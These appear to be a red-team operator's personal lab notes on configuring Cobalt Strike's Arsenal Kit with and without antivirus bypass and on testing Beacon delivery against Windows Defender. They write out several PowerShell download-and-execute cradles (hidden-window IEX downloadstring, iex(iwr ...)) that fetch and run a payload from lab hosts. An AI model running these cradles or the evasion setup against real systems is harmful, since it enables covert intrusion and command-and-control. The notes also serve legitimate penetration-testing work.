### Goal:
***didnt go this route***
going to make a script that gives an option to use default `resource kit` and default `artifact kit` for systems that dont require `AV` bypass, as well as an option to 


### Maybe Goal:
- Since the `resource kit` and `artifact kit` are built using `build_arsenal_kit.sh` should just be able to turn `ON/OFF` `AV bypass` by changing the script that `Cobalt Strike` utilizes.

current `Script` that bypasses `AV`
![[Pasted image 20250317154727.png]]
so unload that one and load a `arsenal_kit.cna` that was built with `default cobalt new load` at `/home/kali/tools/cobaltstrike/arsenal-kit/dist/arsenal_kit.cna`
![[Pasted image 20250317154902.png]]
now that its loaded going to test `Resource Kit` and `Artifact Kit` 

creating `http` listener

![[Pasted image 20250317154946.png]]
creating payloads in `/home/kali/SUT/Beacons`

![[Pasted image 20250317155201.png]]

hosting file at `/resource` with `scripted web delivery`

![[Pasted image 20250317155322.png]]
`powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.127.129:80/resource'))"`

making sure `security` is `on`

![[Pasted image 20250317155423.png]]
testing to see if gets caught

```bash
iex(iwr http://192.168.127.129/resource -useb)
```
gets caught which is good
![[Pasted image 20250317155543.png]]
now testing `resource` but turning off all threat protection
![[Pasted image 20250317155641.png]]
able to catch beacon with protections off
![[Pasted image 20250317155705.png]]

changing the default `/home/kali/tools/cobaltstrike/arsenal-kit/dist/arsenal_kit.cna` name to `arsenal_kit-NO-AV-BYPASS.cna` and testing again - making sure defender back on

![[Pasted image 20250317160632.png]]
reloaded with new name
![[Pasted image 20250317160657.png]]
created listener
![[Pasted image 20250317160719.png]]
generating payloads
![[Pasted image 20250317160745.png]]
doing  `scripted web delivery` again with `resource2`
![[Pasted image 20250317160823.png]]
`iex(iwr http://192.168.127.129/resource2 -useb)`
still caught - which is good
![[Pasted image 20250317160908.png]]
turning off defender again and trying again to make sure it works
![[Pasted image 20250317160954.png]]

![[Pasted image 20250317161012.png]]
caught beacon - good to go
![[Pasted image 20250317161028.png]]

No AV- BYpass
```bash
iex(iwr http://192.168.179.130/a -useb) 
```

AV
```bash
iex(iwr http://192.168.179.130/b -useb) 
```
